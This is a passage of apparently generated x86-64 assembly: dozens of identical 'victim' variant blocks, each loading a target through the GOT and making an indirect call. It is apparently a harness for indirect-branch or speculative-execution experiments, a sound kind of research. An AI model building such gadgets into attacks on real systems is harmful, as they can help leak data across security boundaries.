	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 281
.Lvictim_win0_var281:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 282
.Lvictim_win0_var282:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 283
.Lvictim_win0_var283:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 284
.Lvictim_win0_var284:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 285
.Lvictim_win0_var285:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 286
.Lvictim_win0_var286:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 287
.Lvictim_win0_var287:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 288
.Lvictim_win0_var288:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 289
.Lvictim_win0_var289:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 290
.Lvictim_win0_var290:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 291
.Lvictim_win0_var291:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 292
.Lvictim_win0_var292:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 293
.Lvictim_win0_var293:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 294
.Lvictim_win0_var294:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 295
.Lvictim_win0_var295:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 296
.Lvictim_win0_var296:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 297
.Lvictim_win0_var297:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 298
.Lvictim_win0_var298:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 299
.Lvictim_win0_var299:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 300
.Lvictim_win0_var300:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 301
.Lvictim_win0_var301:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 302
.Lvictim_win0_var302:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 303
.Lvictim_win0_var303:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 304
.Lvictim_win0_var304:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 305
.Lvictim_win0_var305:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 306
.Lvictim_win0_var306:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 307
.Lvictim_win0_var307:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 308
.Lvictim_win0_var308:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 309
.Lvictim_win0_var309:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 310
.Lvictim_win0_var310:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 311
.Lvictim_win0_var311:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 312
.Lvictim_win0_var312:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 313
.Lvictim_win0_var313:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 314
.Lvictim_win0_var314:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 315
.Lvictim_win0_var315:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 316
.Lvictim_win0_var316:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 317
.Lvictim_win0_var317:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 318
.Lvictim_win0_var318:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 319
.Lvictim_win0_var319:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 320
.Lvictim_win0_var320:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 321
.Lvictim_win0_var321:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 322
.Lvictim_win0_var322:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 323
.Lvictim_win0_var323:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 324
.Lvictim_win0_var324:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 325
.Lvictim_win0_var325:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 326
.Lvictim_win0_var326:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 327
.Lvictim_win0_var327:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 328
.Lvictim_win0_var328:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 329
.Lvictim_win0_var329:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 330
.Lvictim_win0_var330:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 331
.Lvictim_win0_var331:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 332
.Lvictim_win0_var332:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 333
.Lvictim_win0_var333:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 334
.Lvictim_win0_var334:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 335
.Lvictim_win0_var335:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 336
.Lvictim_win0_var336:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 337
.Lvictim_win0_var337:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 338
.Lvictim_win0_var338:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 339
.Lvictim_win0_var339:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 340
.Lvictim_win0_var340:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 341
.Lvictim_win0_var341:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 342
.Lvictim_win0_var342:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 343
.Lvictim_win0_var343:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 344
.Lvictim_win0_var344:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 345
.Lvictim_win0_var345:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 346
.Lvictim_win0_var346:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 347
.Lvictim_win0_var347:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 348
.Lvictim_win0_var348:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 349
.Lvictim_win0_var349:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 350
.Lvictim_win0_var350:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 351
.Lvictim_win0_var351:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 352
.Lvictim_win0_var352:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 353
.Lvictim_win0_var353:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 354
.Lvictim_win0_var354:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 355
.Lvictim_win0_var355:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 356
.Lvictim_win0_var356:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 357
.Lvictim_win0_var357:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 358
.Lvictim_win0_var358:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 359
.Lvictim_win0_var359:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 360
.Lvictim_win0_var360:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 361
.Lvictim_win0_var361:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 362
.Lvictim_win0_var362:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 363
.Lvictim_win0_var363:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 364
.Lvictim_win0_var364:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 365
.Lvictim_win0_var365:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 366
.Lvictim_win0_var366:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 367
.Lvictim_win0_var367:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 368
.Lvictim_win0_var368:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 369
.Lvictim_win0_var369:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 370
.Lvictim_win0_var370:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 371
.Lvictim_win0_var371:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 372
.Lvictim_win0_var372:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 373
.Lvictim_win0_var373:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
